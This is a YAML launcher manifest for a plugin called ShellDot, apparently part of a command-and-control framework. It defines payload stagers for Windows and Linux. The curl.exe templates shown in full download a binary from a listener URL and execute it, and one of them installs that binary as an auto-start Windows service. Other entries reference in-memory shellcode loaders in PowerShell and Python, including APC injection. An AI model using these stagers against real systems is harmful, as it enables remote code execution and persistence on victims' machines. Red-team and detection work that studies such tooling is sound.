---
name: Default Example Launchers
version: 0.8.0
description: Default Launchers Client Plugin by ShellDot
type: launcher
launchers:
  - name: "Download and Execute in [CMD]"
    match:
      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
      arch: ["x64", "x86"]
      platform: ["windows"]
    template: 'curl.exe %%isHTTPS%% "%%url%%" -o %%filename%% && %%filename%%'
    args:
      - name: url
      - name: isHTTPS
        jsFn: |
          listener.configuration.https ? "-k" : "";
      - name: randomBinName
        jsFile: lib/arg.randomBinName.js
      - name: filename
        jsFn: |
          const payloadType = payload.configuration.type;
          const fileExtension = payloadsStore().extensionMap.get(payloadType);
          `${argumentsPluginInterface['randomBinName']}.${fileExtension}`; // Using previously parsed argument via argumentsPluginInterface
  - name: "Download and Execute [Linux]"
    match:
      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"] # Supported Payload Types. Available: [EXECUTABLE, DEBUG_EXECUTABLE, SHELLCODE, SERVICE, DLL]
      arch: ["x64", "x86"] # Supported payload architectures. Available: [x64, x86]
      platform: ["linux"] # Supported platforms. Available: [windows, linux]
    path: "template.multi.curl-exe.sh"
    args:
      - name: url
      - name: randomBinName
        jsFile: lib/arg.randomBinName.js
      - name: filename
        jsFn: |
          `/tmp/${argumentsPluginInterface['randomBinName']}.bin`
      - name: isHTTPS
        jsFn: |
          listener.configuration.https ? "-k" : " ";

  - name: "Download and Execute in [PowerShell]"
    match:
      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
      arch: ["x64", "x86"]
      platform: ["windows"]
    type: file
    path: "template.multi.powershell.ps1"
    args:
      - name: url
      - name: isHTTPS
        jsFn: |
          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
      - name: randomBinName
        jsFile: lib/arg.randomBinName.js
      - name: filename
        jsFn: |
          const payloadType = payload.configuration.type;
          const fileExtension = payloadsStore().extensionMap.get(payloadType);
          `${argumentsPluginInterface['randomBinName']}.${fileExtension}`; // Using previously parsed argument via argumentsPluginInterface
  # SC does not put file on disk. It is executed directly from memory.
  - name: "Download and Execute in PowerShell (SC)"
    match:
      type: ["SHELLCODE"]
      arch: ["x64", "x86"]
      platform: ["windows"]
    type: file
    path: "template.multi.shellcode.powershell.ps1"
    args:
      - name: url
      - name: isHTTPS
        jsFn: |
          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
  # Same as powershell, but in python
  - name: "Download and Execute in Python"
    match:
      type: ["SHELLCODE"]
      arch: ["x64", "x86"] # python interpreter needs to be x64 or x86
      platform: ["windows"]
    type: file
    path: "template.shellcode_python_template.py"
    args:
      - name: url
      - name: isHTTPS
  # We use APC to inject shellcode to local process
  - name: "Download and Execute in Python via APC"
    match:
      type: ["SHELLCODE"]
      arch: ["x64", "x86"] # python interpreter needs to be x64 or x86
      platform: ["windows"]
    type: file
    path: "template.APC_python_shellcode_template.py"
    args:
      - name: url
      - name: isHTTPS
  - name: "Download, create and start service [CMD]"
    match:
      type: ["SERVICE"]
      arch: ["x64", "x86"]
      platform: ["windows"]
    template: 'curl.exe %%isHTTPS%% "%%url%%" -o "%%filename%%" && sc create %%svc_name%%_service binPath= "\"%CD%\%%filename%%\"" start= auto && sc start  %%svc_name%%_service'
    args:
      - name: url
      - name: isHTTPS
        jsFn: |
          listener.configuration.https ? "-k" : "";
      - name: randomBinName
        jsFile: lib/arg.randomBinName.js
      - name: filename
        jsFn: |
          const payloadType = payload.configuration.type;
          const fileExtension = payloadsStore().extensionMap.get(payloadType);
          `${argumentsPluginInterface['randomBinName']}.${fileExtension}`; // Using previously parsed argument via argumentsPluginInterface
      - name: svc_name
        jsFn: |
          `${argumentsPluginInterface['randomBinName']}`;